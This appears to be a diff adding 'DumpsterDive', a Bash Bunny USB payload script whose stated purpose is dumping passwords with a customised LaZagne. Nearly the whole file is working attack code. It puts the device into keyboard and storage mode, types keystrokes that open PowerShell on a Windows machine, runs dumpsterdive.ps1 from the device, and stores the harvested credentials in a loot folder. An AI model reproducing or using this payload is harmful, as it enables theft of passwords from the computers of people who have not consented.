@@ -1,0 +1,46 @@
+############################################################################################
+# Name: DumpsterDive
+# Purpose: Dump passwords with a customized version of Lazagne
+# Version: 1.0
+# Author: assume-breach
+# Contact: twitter.com/assume-breach
+# Based on PasswordGrabber by jdebetaz, Hak5Darren, AlessandroZ, TeCHemically, dragmus13, RazerBlade
+# Date: 2022-04-01
+#############################################################################################
+
+#!/bin/bash
+
+# Options
+LOOTDIR=/root/udisk/loot/DumpsterDive
+
+######## INITIALIZATION ########
+LED SETUP
+GET SWITCH_POSITION
+ATTACKMODE HID STORAGE
+DUCKY_LANGUAGE us
+
+######## MAKE LOOT DIRECTORY ########
+mkdir -p $LOOTDIR
+
+####### ATTACK ######
+Q GUI m
+Q DELAY 500
+Q GUI r
+Q DELAY 500
+Q STRING "powershell"
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+Q STRING "cd ((gwmi win32_volume -f 'label=''BashBunny''').Name+'tools\')"
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+Q STRING ".\dumpsterdive.ps1"
+Q DELAY 500
+Q ENTER
+Q DELAY 500
+Q STRING exit
+Q DELAY 500
+Q ENTER
+sleep 5
+LED FINISH
